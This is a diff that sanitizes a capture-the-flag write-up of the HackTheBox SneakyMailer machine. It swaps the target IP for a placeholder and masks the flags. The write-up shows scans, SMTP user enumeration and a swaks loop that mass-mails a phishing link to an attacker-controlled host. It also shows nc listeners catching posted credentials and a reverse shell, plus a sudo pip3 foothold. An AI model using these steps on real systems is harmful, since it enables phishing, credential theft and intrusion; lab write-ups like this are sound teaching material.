@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/SneakyMailer
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-sneakymailer-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
@@ -29,11 +27,11 @@ Short description to include any strange things to be dealt with
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.197`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
-└─$ nmap -n -v -sCV -p- 10.10.10.197
+└─$ nmap -n -v -sCV -p- <YOUR_IP>
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 16:59 EST
 NSE: Loaded 153 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -44,29 +42,29 @@ Completed NSE at 16:59, 0.00s elapsed
 Initiating NSE at 16:59
 Completed NSE at 16:59, 0.00s elapsed
 Initiating Ping Scan at 16:59
-Scanning 10.10.10.197 [2 ports]
+Scanning <YOUR_IP> [2 ports]
 Completed Ping Scan at 16:59, 0.05s elapsed (1 total hosts)
 Initiating Connect Scan at 16:59
-Scanning 10.10.10.197 [65535 ports]
-Discovered open port 22/tcp on 10.10.10.197
-Discovered open port 80/tcp on 10.10.10.197
-Discovered open port 993/tcp on 10.10.10.197
-Discovered open port 25/tcp on 10.10.10.197
-Discovered open port 21/tcp on 10.10.10.197
-Discovered open port 8080/tcp on 10.10.10.197
-Discovered open port 143/tcp on 10.10.10.197
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 22/tcp on <YOUR_IP>
+Discovered open port 80/tcp on <YOUR_IP>
+Discovered open port 993/tcp on <YOUR_IP>
+Discovered open port 25/tcp on <YOUR_IP>
+Discovered open port 21/tcp on <YOUR_IP>
+Discovered open port 8080/tcp on <YOUR_IP>
+Discovered open port 143/tcp on <YOUR_IP>
 Completed Connect Scan at 17:00, 29.26s elapsed (65535 total ports)
 Initiating Service scan at 17:00
-Scanning 7 services on 10.10.10.197
+Scanning 7 services on <YOUR_IP>
 Completed Service scan at 17:00, 10.12s elapsed (7 services on 1 host)
-NSE: Script scanning 10.10.10.197.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 17:00
 Completed NSE at 17:00, 13.18s elapsed
 Initiating NSE at 17:00
 Completed NSE at 17:01, 28.39s elapsed
 Initiating NSE at 17:01
 Completed NSE at 17:01, 0.00s elapsed
-Nmap scan report for 10.10.10.197
+Nmap scan report for <YOUR_IP>
 Host is up (0.078s latency).
 Not shown: 65528 closed ports
 PORT     STATE SERVICE  VERSION
@@ -135,10 +133,10 @@ Nmap done: 1 IP address (1 host up) scanned in 81.28 seconds
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
-└─$ ftp 10.10.10.197
-Connected to 10.10.10.197.
+└─$ ftp <YOUR_IP>
+Connected to <YOUR_IP>.
 220 (vsFTPd 3.0.3)
-Name (10.10.10.197:zweilos): anonymous
+Name (<YOUR_IP>:zweilos): anonymous
 530 Permission denied.
 Login failed.
 ftp> exit
@@ -154,8 +152,6 @@ port 80 - redirected to [http://sneakycorp.htb/](http://sneakycorp.htb/) - added
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-sneakycorp.png)
 
 After adding the domain name to /etc/hosts
-
-
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-messages.png)
 
@@ -300,8 +296,6 @@ found pypiserver version 1.3.2 - newest is 1.4.2
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-pypi-sneakycorp-8080-auth.png)
 
-
-
 [https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273](https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273)
 
 ### Port 25 - SMTP
@@ -311,7 +305,7 @@ found pypiserver version 1.3.2 - newest is 1.4.2
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ telnet sneakycorp.htb 25                                                                        1 ⨯
-Trying 10.10.10.197...
+Trying <YOUR_IP>...
 Connected to sneakycorp.htb.
 Escape character is '^]'.
 HELO
@@ -326,7 +320,6 @@ RCPT TO:bradleygreer@sneakymailer.htb
 DATA
 354 End data with <CR><LF>.<CR><LF>
 This is a test!    
-
 
 .
 250 2.0.0 Ok: queued as 155A82467F
@@ -357,7 +350,6 @@ Matching Modules
    -  ----                              ---------------  ----    -----  -----------
    0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility
 
-
 [*] Using auxiliary/scanner/smtp/smtp_enum
 msf5 auxiliary(scanner/smtp/smtp_enum) > options
 
@@ -365,28 +357,27 @@ Module options (auxiliary/scanner/smtp/smtp_enum):
 
    Name       Current Setting                                                Required  Description
    ----       ---------------                                                --------  -----------
-   RHOSTS     10.10.10.193                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RHOSTS     <YOUR_IP>                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
    RPORT      25                                                             yes       The target port (TCP)
    THREADS    1                                                              yes       The number of concurrent threads (max one per host)
    UNIXONLY   true                                                           yes       Skip Microsoft bannered servers when testing unix users
    USER_FILE  /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       The file that contains a list of probable users accounts.
 
-msf5 auxiliary(scanner/smtp/smtp_enum) > set rhosts 10.10.10.197
-rhosts => 10.10.10.197
+msf5 auxiliary(scanner/smtp/smtp_enum) > set rhosts <YOUR_IP>
+rhosts => <YOUR_IP>
 msf5 auxiliary(scanner/smtp/smtp_enum) > run
 
-
-[*] 10.10.10.197:25       - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
-[+] 10.10.10.197:25       - 10.10.10.197:25 Users found: , _apt, avahi-autoipd, backup, bin, daemon, ftp, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, www-data
-[*] 10.10.10.197:25       - Scanned 1 of 1 hosts (100% complete)
+[*] <YOUR_IP>:25       - <YOUR_IP>:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
+[+] <YOUR_IP>:25       - <YOUR_IP>:25 Users found: , _apt, avahi-autoipd, backup, bin, daemon, ftp, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, www-data
+[*] <YOUR_IP>:25       - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf5 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE users
 USER_FILE => users
 msf5 auxiliary(scanner/smtp/smtp_enum) > run
 
-[*] 10.10.10.197:25       - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
-[+] 10.10.10.197:25       - 10.10.10.197:25 Users found: airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb
-[*] 10.10.10.197:25       - Scanned 1 of 1 hosts (100% complete)
+[*] <YOUR_IP>:25       - <YOUR_IP>:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
+[+] <YOUR_IP>:25       - <YOUR_IP>:25 Users found: airisatou@sneakymailer.htb, angelicaramos@sneakymailer.htb, ashtoncox@sneakymailer.htb, bradleygreer@sneakymailer.htb, brendenwagner@sneakymailer.htb, briellewilliamson@sneakymailer.htb, brunonash@sneakymailer.htb, caesarvance@sneakymailer.htb, carastevens@sneakymailer.htb, cedrickelly@sneakymailer.htb, chardemarshall@sneakymailer.htb, colleenhurst@sneakymailer.htb, dairios@sneakymailer.htb, donnasnider@sneakymailer.htb, doriswilder@sneakymailer.htb, finncamacho@sneakymailer.htb, fionagreen@sneakymailer.htb, garrettwinters@sneakymailer.htb, gavincortez@sneakymailer.htb, gavinjoyce@sneakymailer.htb, glorialittle@sneakymailer.htb, haleykennedy@sneakymailer.htb, hermionebutler@sneakymailer.htb, herrodchandler@sneakymailer.htb, hopefuentes@sneakymailer.htb, howardhatfield@sneakymailer.htb, jacksonbradshaw@sneakymailer.htb, jenagaines@sneakymailer.htb, jenettecaldwell@sneakymailer.htb, jenniferacosta@sneakymailer.htb, jenniferchang@sneakymailer.htb, jonasalexander@sneakymailer.htb, laelgreer@sneakymailer.htb, martenamccray@sneakymailer.htb, michaelsilva@sneakymailer.htb, michellehouse@sneakymailer.htb, olivialiang@sneakymailer.htb, paulbyrd@sneakymailer.htb, prescottbartlett@sneakymailer.htb, quinnflynn@sneakymailer.htb, rhonadavidson@sneakymailer.htb, sakurayamamoto@sneakymailer.htb, sergebaldwin@sneakymailer.htb, shaddecker@sneakymailer.htb, shouitou@sneakymailer.htb, sonyafrost@sneakymailer.htb, sukiburks@sneakymailer.htb, sulcud@sneakymailer.htb, tatyanafitzpatrick@sneakymailer.htb, thorwalton@sneakymailer.htb, tigernixon@sneakymailer.htb, timothymooney@sneakymailer.htb, unitybutler@sneakymailer.htb, vivianharrell@sneakymailer.htb, yuriberry@sneakymailer.htb, zenaidafrank@sneakymailer.htb, zoritaserrano@sneakymailer.htb
+[*] <YOUR_IP>:25       - Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
 
@@ -400,10 +391,10 @@ Searched how to interact with SMTP through command line - [https://github.com/je
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ for address in $(cat users); do swaks --helo sneakycorp.htb \
 --to $address --from zweilos@sneakymailer.htb --header "Subject: Check this out" \
---body "Check this out! http://10.10.15.100:8090/" --server 10.10.10.197; done
+--body "Check this out! http://10.10.15.100:8090/" --server <YOUR_IP>; done
   
-=== Trying 10.10.10.197:25...
-=== Connected to 10.10.10.197.
+=== Trying <YOUR_IP>:25...
+=== Connected to <YOUR_IP>.
 <-  220 debian ESMTP Postfix (Debian/GNU)
  -> EHLO sneakycorp.htb
 <-  250-debian
@@ -438,8 +429,8 @@ Searched how to interact with SMTP through command line - [https://github.com/je
  -> QUIT
 <-  221 2.0.0 Bye
 === Connection closed with remote host.
-=== Trying 10.10.10.197:25...
-=== Connected to 10.10.10.197.
+=== Trying <YOUR_IP>:25...
+=== Connected to <YOUR_IP>.
 <-  220 debian ESMTP Postfix (Debian/GNU)
  -> EHLO sneakycorp.htb
 <-  250-debian
@@ -482,10 +473,10 @@ no reply, so maybe try working local address? also put the "link" on a new line 
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ for address in $(cat users); do swaks --helo sneakycorp.htb \
 --to $address --from root@sneakymailer.htb --header "Subject: Check this out" \
---body "Check this out. \nhttp://10.10.15.100:8090/" --server 10.10.10.197; done 
+--body "Check this out. \nhttp://10.10.15.100:8090/" --server <YOUR_IP>; done 
 
-=== Trying 10.10.10.197:25...
-=== Connected to 10.10.10.197.
+=== Trying <YOUR_IP>:25...
+=== Connected to <YOUR_IP>.
 <-  220 debian ESMTP Postfix (Debian/GNU)
  -> EHLO sneakycorp.htb
 <-  250-debian
@@ -524,8 +515,8 @@ no reply, so maybe try working local address? also put the "link" on a new line 
 
 ...snipped...
 
-=== Trying 10.10.10.197:25...
-=== Connected to 10.10.10.197.
+=== Trying <YOUR_IP>:25...
+=== Connected to <YOUR_IP>.
 <-  220 debian ESMTP Postfix (Debian/GNU)
  -> EHLO sneakycorp.htb
 <-  250-debian
@@ -561,8 +552,8 @@ no reply, so maybe try working local address? also put the "link" on a new line 
  -> QUIT
 <-  221 2.0.0 Bye
 === Connection closed with remote host.
-=== Trying 10.10.10.197:25...
-=== Connected to 10.10.10.197.
+=== Trying <YOUR_IP>:25...
+=== Connected to <YOUR_IP>.
 <-  220 debian ESMTP Postfix (Debian/GNU)
  -> EHLO sneakycorp.htb
 <-  250-debian
@@ -612,7 +603,7 @@ Was doing packet capture the whole time trying to see if my messages were being 
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ nc -lvnp 8090                                                                                  1 ⨯
 listening on [any] 8090 ...
-connect to [10.10.14.174] from (UNKNOWN) [10.10.10.197] 51434
+connect to [10.10.14.174] from (UNKNOWN) [<YOUR_IP>] 51434
 POST / HTTP/1.1
 Host: 10.10.14.174:8090
 User-Agent: python-requests/2.23.0
@@ -678,10 +669,10 @@ However, this did not work, nor did logging into SSH.  I checked back with my nm
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
-└─$ ftp 10.10.10.197                                                                              255 ⨯
-Connected to 10.10.10.197.
+└─$ ftp <YOUR_IP>                                                                              255 ⨯
+Connected to <YOUR_IP>.
 220 (vsFTPd 3.0.3)
-Name (10.10.10.197:zweilos): developer
+Name (<YOUR_IP>:zweilos): developer
 331 Please specify the password.
 Password:
 230 Login successful.
@@ -884,7 +875,7 @@ Script started, output log file is 'sneaky-transcript'.
 └─$ bash                
 zweilos@kali:~/htb/sneakymailer$ nc -lvnp 46445
 listening on [any] 46445 ...
-connect to [10.10.14.174] from (UNKNOWN) [10.10.10.197] 60704
+connect to [10.10.14.174] from (UNKNOWN) [<YOUR_IP>] 60704
 bash: cannot set terminal process group (725): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ python -c 'import pty;pty.spawn("/bin/bash")'
@@ -1186,7 +1177,7 @@ It complained a bit that I didn't create a readme, but it ran
 ```text
 ┌──(zweilos㉿kali-[~/htb/sneakymailer]
 └─$ ssh -i dev low@sneakycorp.htb   
-The authenticity of host 'sneakycorp.htb (10.10.10.197)' can't be established.
+The authenticity of host 'sneakycorp.htb (<YOUR_IP>)' can't be established.
 ECDSA key fingerprint is SHA256:I1lCFRteozDGkqC/ZSE2SbHl8ISpJWhfu5nwn6LxbA0.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added 'sneakycorp.htb' (ECDSA) to the list of known hosts.
@@ -1211,7 +1202,7 @@ Matching Defaults entries for low on sneakymailer:
 User low may run the following commands on sneakymailer:
     (root) NOPASSWD: /usr/bin/pip3
 low@sneakymailer:~$ cat user.txt 
-06106e8ea4721e1a01714bf6ef000a88
+****
 ```
 
 Next I tried logging in with the ssh key I had made and was successful!  I got that same temporary name resolution error when using `sudo -l`, where it seemed to hang for a minute, but this time I got a very interesting result!
@@ -1289,13 +1280,9 @@ drwxr-xr-x  3 root root 4096 May 14 12:57 .local
 -rwx------  1 root root   33 Nov 11 01:09 root.txt
 -rw-r--r--  1 root root   66 May 27 13:00 .selected_editor
 # cat root.txt
-81337e5b7eb0c72e251736d031a72998
+****
 ```
 
 fine
 
 ![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/sneakymailer-pwned.png)
-
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
